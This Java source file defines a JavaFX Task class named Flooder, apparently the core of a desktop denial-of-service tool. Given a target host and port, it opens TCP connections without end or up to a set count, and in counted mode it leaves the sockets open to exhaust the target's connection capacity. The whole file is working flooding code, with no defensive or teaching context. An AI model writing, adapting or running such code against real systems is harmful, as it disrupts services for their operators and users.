package graviton.core;

import javafx.beans.property.SimpleStringProperty;
import javafx.concurrent.Task;
import javafx.scene.control.ProgressIndicator;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;

/**
 * Created by Botan on 08/04/2016.
 */
public class Flooder extends Task<Void> {
    private final SimpleStringProperty name;

    private final String host;
    private final int port;
    private final int waitingTime;
    private int connections;

    private boolean stopped = false;
    private boolean running = false;

    public Flooder(String name, String host, int port, int connections, int waitingTime) {
        this.name = new SimpleStringProperty(name);
        this.host = host;
        this.port = port;
        this.connections = connections;
        this.waitingTime = waitingTime;
        updateTitle("Waiting...");
        this.updateProgress(-1, 100);
    }

    public SimpleStringProperty nameProperty() {
        return this.name;
    }

    public void stop() {
        this.updateProgress(1, 1);
        this.stopped = true;
        this.connections = 1;
        updateTitle("Stopped");
    }

    @Override
    protected Void call() throws Exception {
        updateTitle("Running");
        running = true;
        if(connections == 0) {
            int exception = 0;
            this.updateProgress(ProgressIndicator.INDETERMINATE_PROGRESS, -1);
            while (!stopped) {
                try {
                    if (waitingTime != 0)
                        Thread.sleep(waitingTime);
                    new Socket(host, port).close();
                } catch (IOException e) {
                    exception++;
                    if(exception > 5) {
                        updateMessage("Unable to connect to this address -> " + e.getMessage().split(":")[0]);
                        this.updateProgress(1, 1);
                        this.stopped = true;
                        this.connections = 1;
                        updateTitle("Error");
                        break;
                    } else continue;
                } catch (InterruptedException e) {
                    updateMessage("Unknown error -> " + e.getMessage());
                }
            }
        } else for (int i = 0; i <= connections && !stopped; i++) {
            try {
                if (waitingTime != 0)
                    Thread.sleep(waitingTime);
                new Socket(host, port);
                updateProgress(i, connections);
            } catch (IOException e) {
                if(i < 10) {
                    updateMessage("Unable to connect to this address -> " + e.getMessage().split(":")[0]);
                    this.updateProgress(1, 1);
                    this.stopped = true;
                    this.connections = 1;
                    updateTitle("Error");
                    break;
                } else continue;
            } catch (InterruptedException e) {
                updateMessage("Unknown error -> " + e.getMessage());
            }
        }
        if(!stopped)
            updateTitle("Done");
        running = false;
        return null;
    }

    public boolean isStarted() {
        return this.running;
    }

}
